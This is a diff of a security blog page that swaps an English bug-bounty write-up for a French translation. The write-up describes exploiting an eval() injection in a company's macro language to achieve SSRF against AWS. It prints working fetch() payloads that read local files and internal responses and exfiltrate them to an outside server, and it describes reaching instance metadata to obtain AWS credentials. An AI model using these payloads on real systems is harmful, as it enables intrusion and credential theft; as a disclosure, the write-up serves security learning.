@@ -5,20 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <meta name="author" content="Gwendal Le Coguic">
-    <meta name="description" content="Here is the story of a bug I found in a private bug bounty program on Hackerone. It took me exactly 12h30 -no break- to find it, exploit and report. I was able to dump the AWS credentials, this lead …" />
+    <meta name="description" content="Voici l’histoire d’une faille que j’ai découverte dans un programme de bug bunty privé sur Hackerone. Il m’a fallu exactement 12h30, sans interruption, pour la trouver, l’exploiter et la signaler. …" />
     <meta name="keywords" content="développeur,application web,cybersécurité,test d&#39;intrusion,bug bounty,outils de cybersécurité,formations,bash,PHP,Python,Golang,outils offensifs" />
 
     <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://glc.st/images/aws-webservices.png"/>
 
 <meta name="twitter:title" content="AWS takeover through SSRF in JavaScript - Gwendal Le Coguic" />
-<meta name="twitter:description" content="Here is the story of a bug I found in a private bug bounty program on Hackerone. It took me exactly 12h30 -no break- to find it, exploit and report. I was able to dump the AWS credentials, this lead …" />
+<meta name="twitter:description" content="Voici l’histoire d’une faille que j’ai découverte dans un programme de bug bunty privé sur Hackerone. Il m’a fallu exactement 12h30, sans interruption, pour la trouver, l’exploiter et la signaler. …" />
 
 <meta name="twitter:site" content="@Gwendal Le Coguic"/>
 <meta name="twitter:creator" content="@gwendallecoguic"/>
 
     <meta property="og:title" content="AWS takeover through SSRF in JavaScript - Gwendal Le Coguic" />
-<meta property="og:description" content="Here is the story of a bug I found in a private bug bounty program on Hackerone. It took me exactly 12h30 -no break- to find it, exploit and report. I was able to dump the AWS credentials, this lead …" />
+<meta property="og:description" content="Voici l’histoire d’une faille que j’ai découverte dans un programme de bug bunty privé sur Hackerone. Il m’a fallu exactement 12h30, sans interruption, pour la trouver, l’exploiter et la signaler. …" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/" />
 
@@ -74,7 +74,7 @@
 
 
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@id":"https://glc.st/#person"},"dateModified":"2026-11-22","datePublished":"2018-10-02","description":"Here is the story of a bug I found in a private bug bounty program on Hackerone. It took me exactly 12h30 -no break- to find it, exploit and report. I was …","headline":"AWS takeover through SSRF in JavaScript","image":"https://glc.st/images/aws-webservices.png","inLanguage":"fr","keywords":"bug bounty, aws, ssrf, javascript","publisher":{"@id":"https://glc.st/#person"},"url":"https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@id":"https://glc.st/#person"},"dateModified":"2026-11-22","datePublished":"2018-10-02","description":"Voici l\u0026amp;rsquo;histoire d\u0026amp;rsquo;une faille que j\u0026amp;rsquo;ai découverte dans un programme de bug bunty privé sur Hackerone. Il m\u0026amp;rsquo;a fallu exactement …","headline":"AWS takeover through SSRF in JavaScript","image":"https://glc.st/images/aws-webservices.png","inLanguage":"fr","keywords":"bug bounty, aws, ssrf, javascript","publisher":{"@id":"https://glc.st/#person"},"url":"https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/"}</script>
 
   </head>
 
@@ -201,22 +201,25 @@
         </header>
 
         <div>
-            <p>Here is the story of a bug I found in a private bug bounty program on <a href="https://hackerone.com/">Hackerone</a>.
-It took me exactly 12h30 -no break- to find it, exploit and report.
-I was able to dump the AWS credentials, this lead me to fully compromise the account of the company: 20 buckets and 80 EC2 instances (Amazon Elastic Compute Cloud) in my hands.
-Besides the fact that it&rsquo;s one of my best bug in my hunter career, I also learnt alot during this sprint, so let&rsquo;s share!</p>
+            <p>Voici l&rsquo;histoire d&rsquo;une faille que j&rsquo;ai découverte dans un programme de bug bunty privé sur <a href="https://hackerone.com/">Hackerone</a>.
+Il m&rsquo;a fallu exactement 12h30, sans interruption, pour la trouver, l&rsquo;exploiter et la signaler.
+J&rsquo;ai pu récupérer les identifiants AWS, ce qui m&rsquo;a permis de compromettre totalement le compte de l&rsquo;entreprise :
+20 buckets et 80 instances EC2 (Amazon Elastic Compute Cloud) entre mes mains.</p>
+<p>Outre le fait qu&rsquo;il s&rsquo;agit de l&rsquo;une de mes meilleures découvertes en tant que bug hunter,
+j&rsquo;ai également beaucoup appris durant cette session intensive. Alors, laissez moi vous la partarger !</p>
 <h2 id="intro">Intro</h2>
-<p>As I said, the program is private so the company, let&rsquo;s call it: ArticMonkey.<br>
-For the purpose of their activity -and their web application- ArticMonkey has developed a custom macro language, let&rsquo;s call it: Banan++.
-I don&rsquo;t know what language was initially used for the creation of Banan++ but from the webapp you can get a JavaScript version, let&rsquo;s dig in!</p>
-<p>The original <code>banan++.js</code> file was minified, but still huge, 2.1M compressed, 2.5M beautified, 56441 lines and 2546981 characters, enjoy.
-No need to say that I didn&rsquo;t read the whole sh&hellip;
-By searching some keywords very specific to Banan++, I located the first function at line 3348.
-About 135 functions were available at that time.
-This was my playground.</p>
-<h2 id="spot-the-issue">Spot the issue</h2>
-<p>I started to read the code by the top but most of the functions were about date manipulation or mathematical operations, nothing really insteresting or dangerous.
-After a while, I finally found one called <code>Union()</code> that looked promising, below the code:</p>
+<p>Comme je l&rsquo;ai dit, le programme est privé, donc l&rsquo;entreprise, appelons-la ArticMonkey,
+a développé un langage de macros personnalisé pour ses activités et son application web, appelons-le : Banan++.
+J&rsquo;ignore quel langage a été utilisé initialement pour créer Banan++, mais l&rsquo;application web propose une version JavaScript. Creusons un peu !</p>
+<p>Le fichier original <code>banan++.js</code> a été minifié, mais reste énorme : 2,1Mo compressé, 2,5Mo après formatage, soit 56 441 lignes et 2 546 981 caractères. Amusez-vous !
+Inutile de préciser que je n&rsquo;ai pas tout lu…
+En cherchant des mots-clés spécifiques à Banan++, j&rsquo;ai trouvé la première fonction à la ligne 3348.
+Environ 135 fonctions étaient disponibles à ce moment-là.
+Voilà mon terrain de jeu !</p>
+<h2 id="repérer-le-problème">Repérer le problème</h2>
+<p>J&rsquo;ai d&rsquo;abord commencé à lire le code par le haut, mais la plupart des fonctions concernaient la manipulation de dates ou
+des opérations mathématiques, rien de vraiment intéressant ni de dangereux.</p>
+<p>Après un moment, j&rsquo;ai finalement trouvé une fonction appelée <code>Union()</code> qui semblait prometteuse, ci-dessous :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">helper</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">Union</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
 </span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_len22</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arguments</span>.<span style="color:#a6e22e">length</span>, <span style="color:#a6e22e">args</span> <span style="color:#f92672">=</span> Array(<span style="color:#a6e22e">_len22</span>), <span style="color:#a6e22e">_key22</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">_key22</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">_len22</span>; <span style="color:#a6e22e">_key22</span><span style="color:#f92672">++</span>) <span style="color:#a6e22e">args</span>[<span style="color:#a6e22e">_key22</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">arguments</span>[<span style="color:#a6e22e">_key22</span>];
 </span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">shift</span>(),
@@ -230,21 +233,21 @@ After a while, I finally found one called <code>Union()</code> that looked promi
 </span></span><span style="display:flex;"><span>    });
 </span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> <span style="color:#f92672">!!</span><span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">length</span>
 </span></span><span style="display:flex;"><span>  }
-</span></span></code></pre></div><p>Did you notice that? Did you notice that kinky <code>eval()</code>? Looks sooooooooooo interesting!
-I copied the code on a local HTML file in order to perform more tests.</p>
-<p>Basically the function can take from 0 to infinite arguments but start to be useful at 3.
-The <code>eval()</code> is used to compare the first argument to the third one with the help of the second, then the fourth is tested, the fifth etc&hellip;
-Normal usage should be something like <code>Union(1,'&lt;',3);</code> and the returned value <code>true</code> if at least one of these tests is true or <code>false</code>.<br>
-However there is absolutely no sanitization performed or test regarding the type and the value of the arguments.
-With the help of my favourite debugger <code>alert()</code> I understood that an exploit could be triggered in many different ways:</p>
+</span></span></code></pre></div><p>Vous avez remarqué ça ? Vous avez remarqué cette étrange fonction <code>eval()</code> ? C&rsquo;est trèèèèèès intéressant !
+J&rsquo;ai copié le code dans un fichier HTML local pour effectuer d&rsquo;autres tests.</p>
+<p>En gros, la fonction peut prendre de 0 à une infinité d&rsquo;arguments, mais elle devient vraiment utile à partir de 3.</p>
+<p>La fonction <code>eval()</code> sert à comparer le premier argument au troisième grâce au deuxième, puis on teste le quatrième, le cinquième, etc.
+L&rsquo;utilisation normale devrait ressembler à <code>Union(1,'&lt;',3);</code> et la fonction renverrait <code>true</code> si au moins un de ces tests est vrai, ou <code>false</code>.
+Cependant, aucune vérification ni aucun test n&rsquo;est effectué sur le type et la valeur des arguments.
+Grâce à mon débogueur préféré, <code>alert()</code>, j&rsquo;ai compris qu&rsquo;une faille pouvait être exploitée de différentes manières.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">Union</span>( <span style="color:#e6db74">&#39;alert()//&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span> );
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Union</span>( <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2;alert();&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span> );
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Union</span>( <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3;alert()&#39;</span> );
 </span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><h2 id="find-an-injection-point">Find an injection point</h2>
-<p>Ok so I had a vulnerable function, which is always good, but what I needed was an input to inject some malicious code.
-I remembered that I already seen some POST parameters using Banan++ functions so I performed a quick search in my Burp Suite history.
-Got it:</p>
+</span></span></code></pre></div><h2 id="trouver-un-point-dinjection">Trouver un point d&rsquo;injection</h2>
+<p>J&rsquo;avais donc une fonction vulnérable, ce qui est toujours bon signe, mais il me fallait une entrée pour y injecter du code malveillant.
+Je me suis souvenu avoir déjà vu des paramètres POST avec des fonctions Banan++, alors j&rsquo;ai fait une recherche rapide dans l&rsquo;historique de Burp Suite.
+Et voilà !</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /REDACTED <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">api.REDACTED.com</span>
 </span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
@@ -258,7 +261,7 @@ Got it:</p>
 </span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">auth=REDACTED</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;( Year( CurrentDate() ) &gt; 2017 )&#34;</span>}
-</span></span></code></pre></div><p>Response:</p>
+</span></span></code></pre></div><p>Réponse:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
 </span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json; charset=utf-8</span>
 </span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">54</span>
@@ -269,10 +272,10 @@ Got it:</p>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...REDACTED...</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#960050;background-color:#1e0010">...REDACTED...</span>}]
-</span></span></code></pre></div><p>The parameter <code>operation</code> seems to be a good option. Time for testing!</p>
-<h2 id="perform-the-injection">Perform the injection</h2>
-<p>Since I didn&rsquo;t know anything about Banan++, I had to perform some tests in order to find out what kind of code I could inject or not.
-Sort of manual fuzzing.</p>
+</span></span></code></pre></div><p>Le paramètre <code>operation</code> semble être une bonne option. Il est temps de tester !</p>
+<h2 id="procéder-à-linjection">Procéder à l&rsquo;injection</h2>
+<p>N&rsquo;ayant aucune connaissance de Banan++, j&rsquo;ai dû effectuer des tests pour déterminer quel type de code je pouvais injecter.
+Une sorte de fuzzing manuel.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;&#39;\&#34;&gt;&lt;&#34;</span>}
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#ae81ff">400</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Parse error on line 1...REDACTED...&#34;</span>}
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#66d9ef">null</span>}
@@ -291,14 +294,14 @@ Sort of manual fuzzing.</p>
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#ae81ff">400</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Function &#39;alert&#39; is not defined&#34;</span>}
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;Union()&#34;</span>}
 </span></span><span style="display:flex;"><span>[]
-</span></span></code></pre></div><p>What I conclued here was:</p>
+</span></span></code></pre></div><p>J&rsquo;en ai conclu que :</p>
 <ul>
-<li>I cannot inject whatever JavaScript I want</li>
-<li>I can inject Banan++ functions</li>
-<li>the response seems to act like a true/false flag depending if the interpretation of parameter <code>operation</code> is true or false
-(which was very useful to validate the code I injected)</li>
+<li>Je ne peux pas injecter n&rsquo;importe quel code JavaScript.</li>
+<li>Je peux injecter des fonctions Banan++.</li>
+<li>La réponse se comporte comme un indicateur booléen, vrai/faux, selon que l&rsquo;interprétation du paramètre <code>operation</code> est vraie ou fausse.
+(Ce qui s&rsquo;est avéré très utile pour valider le code injecté)</li>
 </ul>
-<p>Let&rsquo;s continue with <code>Union()</code>:</p>
+<p>Continuons avec <code>Union()</code> :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;Union(1,2,3)&#34;</span>}
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#ae81ff">400</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Parse error on line 1...REDACTED...&#34;</span>}
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;Union(a,b,c)&#34;</span>}
@@ -313,39 +316,41 @@ Sort of manual fuzzing.</p>
 </span></span><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#960050;background-color:#1e0010">...REDACTED...</span>}]
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">...REDACTED...,</span><span style="color:#f92672">&#34;operation&#34;</span>:<span style="color:#e6db74">&#34;Union(&#39;1&#39;;&#39;&gt;&#39;;&#39;3&#39;)&#34;</span>}
 </span></span><span style="display:flex;"><span>[]<span style="color:#960050;background-color:#1e0010">]</span>
-</span></span></code></pre></div><p>Perfect! If <code>1 &lt; 3</code> then the response contains valid datas (true), but if <code>1 &gt; 3</code> then the response is empty (false).
-Parameters must be separated by a semi colon.
-I could now try a real attack.</p>
+</span></span></code></pre></div><p>Parfait ! Si <code>1 &lt; 3</code>, la réponse contient des données valides (vrai), sinon elle est vide (faux).
+Les paramètres doivent être séparés par un point-virgule.
+Je peux maintenant tenter une véritable attaque.</p>
 <h2 id="fetch-is-the-new-xmlhttprequest">fetch is the new XMLHttpRequest</h2>
-<p>Because the request is an ajax call to the api that only returns JSON datas, it&rsquo;s obviously not a client side injection.
-I also knew from a previous report that ArticMonkey tends to use alot JavaScript server side.</p>
-<p>But it doesn&rsquo;t matter, I had to try everything, maybe I could trigger an error that would reveal informations about the system the JavaScript runs on.
-Since my local testing, I knew exactly how to inject my malicious code. I tried basic XSS payloads and malformed JavaScript but all I got was the error previously mentionned.</p>
-<p>I then tried to fire an HTTP request.</p>
-<p>With an ajax call first:</p>
+<p>Comme la requête est un appel AJAX à l&rsquo;API qui ne renvoie que des données JSON, il ne s&rsquo;agit manifestement pas d&rsquo;une injection côté client.
+Je savais également, grâce à un rapport précédent, qu&rsquo;ArticMonkey a tendance à utiliser beaucoup de JavaScript côté serveur.
+Mais peu importe, je devais tout essayer. Peut-être pourrais-je déclencher une erreur qui révélerait des informations sur
+le système sur lequel le JavaScript s&rsquo;exécute.
+Ayant effectué des tests en local, je savais exactement comment injecter mon code malveillant.
+J&rsquo;ai essayé des payloads XSS classiques et du JavaScript malformé, mais je n&rsquo;ai obtenu que l&rsquo;erreur mentionnée précédemment.</p>
+<p>J&rsquo;ai ensuite tenté d&rsquo;envoyer une requête HTTP.</p>
+<p>En commençant par un appel AJAX :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;https://poc.myserver.com&#39;</span> );
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">send</span>();
-</span></span></code></pre></div><p>But didn&rsquo;t receive anything. I tried HTML injection:</p>
+</span></span></code></pre></div><p>Mais je n&rsquo;ai rien reçu. J&rsquo;ai essayé l&rsquo;injection HTML :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>( <span style="color:#e6db74">&#39;img&#39;</span> );
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;https://poc.myserver.com/xxx.png&#34;&gt;&#39;</span>;
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>( <span style="color:#a6e22e">i</span> );
-</span></span></code></pre></div><p>But didn&rsquo;t receive anything! More tries:</p>
+</span></span></code></pre></div><p>Mais je n&rsquo;ai rien reçu ! Nouvelles tentatives :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;https://poc.myserver.com/xxx.png&#34;&gt;&#39;</span>;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;iframe src=&#34;https://poc.myserver.com&#34;&gt;&#39;</span>;
-</span></span></code></pre></div><p>But didn&rsquo;t receive anything!!!</p>
-<p>Sometimes you know, you have to test stupid things by yourself to understand how stupid it was&hellip;
-Obviously it was a mistake to try to render HTML code, but hey! I&rsquo;m just a hacker&hellip;
-Back to the ajax request, I stayed stuck there for a while.
-It took me quite a long time to figure out how to make it work.</p>
-<p>I finally remembered that ArticMonkey uses ReactJS on their frontend, I would later learnt that they use NodeJS server side.
-Anyway, I checked on Google how to perform an ajax request with it and found the solution in the <a href="https://reactjs.org/docs/faq-ajax.html">official documentation</a> which lead me to the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">fetch()</a> function which is the new standard to perform ajax calls, that was the key.</p>
-<p>I injected the following:</p>
+</span></span></code></pre></div><p>Mais je n&rsquo;ai toujours rien reçu !!!</p>
+<p>Parfois, il faut tester des trucs stupides soi-même pour se rendre compte à quel point c&rsquo;était stupide&hellip;
+Évidemment, essayer de générer du code HTML était une erreur, mais bon ! Je ne suis qu&rsquo;un hacker&hellip;
+Pour en revenir à la requête AJAX, je suis resté bloqué dessus un bon moment.
+Il m&rsquo;a fallu un temps fou pour comprendre comment la faire fonctionner.</p>
+<p>J&rsquo;ai fini par me souvenir qu&rsquo;ArticMonkey utilise ReactJS côté client, et j&rsquo;apprendrais plus tard qu&rsquo;ils utilisent NodeJS côté serveur.</p>
+<p>Bref, j&rsquo;ai cherché sur Google comment effectuer une requête AJAX et j&rsquo;ai trouvé la solution dans la <a href="https://reactjs.org/docs/faq-ajax.html">documentation officielle</a>, qui m&rsquo;a conduit à la fonction <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">fetch()</a>, la nouvelle norme pour les appels AJAX. C&rsquo;était ça la clé.</p>
+<p>J&rsquo;ai injecté les éléments suivants :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://poc.myserver.com&#39;</span>)
-</span></span></code></pre></div><p>And immediately got a new line in my Apache log.</p>
-<p>Being able to ping my server is a thing but it&rsquo;s a blind SSRF, I had no response echoed back.
-I had the idea to chain two requests where the second would send the result of the first one.
-Something like:</p>
+</span></span></code></pre></div><p>Et j&rsquo;ai immédiatement eu une nouvelle ligne dans les logs Apache.</p>
+<p>Je peux pinguer mon serveur, mais c&rsquo;est une attaque SSRF aveugle : je n&rsquo;ai reçu aucune réponse.
+J&rsquo;ai pensé à enchaîner deux requêtes, la seconde renvoyant le résultat de la première.
+Par exemple :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">x1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x1</span>.<span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;https://...&#39;</span>, <span style="color:#66d9ef">false</span> );
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x1</span>.<span style="color:#a6e22e">send</span>();
@@ -354,20 +359,20 @@ Something like:</p>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x2</span>.<span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;https://poc.myserver.com/?r=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">r</span>, <span style="color:#66d9ef">false</span> );
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">x2</span>.<span style="color:#a6e22e">send</span>();
-</span></span></code></pre></div><p>Again it took me while to get the correct syntax with <code>fetch()</code>.
-Thanks <a href="https://stackoverflow.com/a/45529432">StackOverflow</a>.</p>
-<p>I ended with the following code which works pretty well:</p>
+</span></span></code></pre></div><p>Là encore, il m&rsquo;a fallu un certain temps pour trouver la syntaxe correcte avec <code>fetch()</code>.
+Merci à <a href="https://stackoverflow.com/a/45529432">StackOverflow</a>.</p>
+<p>J&rsquo;ai finalement obtenu le code suivant, qui fonctionne plutôt bien :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://...&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">res</span>=&gt;<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>)=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://poc.myserver.com/?r=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">r</span>));
-</span></span></code></pre></div><p>Of course, Origin policy applies.</p>
-<h2 id="ssrf-for-the-win">SSRF for the win</h2>
-<p>I firstly tried to read local files:</p>
+</span></span></code></pre></div><p>Bien entendu, la politique d&rsquo;Origin s&rsquo;applique.</p>
+<h2 id="ssrf-pour-la-victoire">SSRF pour la victoire</h2>
+<p>J&rsquo;ai d&rsquo;abord essayé de lire les fichiers locaux :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;file:///etc/issue&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">res</span>=&gt;<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>)=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://poc.myserver.com/?r=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">r</span>));
-</span></span></code></pre></div><p>But the response (<code>r</code> parameter) in my Apache log file was empty.</p>
-<p>Since I found some S3 buckets related to ArticMonkey (<code>articmonkey-xxx</code>), I thought that this company might also use AWS servers for their webapp (which was also confirmed by the header in some responses <code>x-cache: Hit from cloudfront</code>).
-I quickly jumped on the list of the most common <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection">SSRF URL for Cloud Instances</a>.</p>
-<p>And got a nice hit when I tried to access the metadatas of the instance.
-<a href="https://glc.st/images/ssrf-aws-takeover-burpsuite.png" title="aws takeover through ssrf in javascript" target="_blank"><img src="https://glc.st/images/ssrf-aws-takeover-burpsuite.png" alt="aws takeover through ssrf in javascript" /></a></p>
-<p>Decoded output is the directory listing returned:</p>
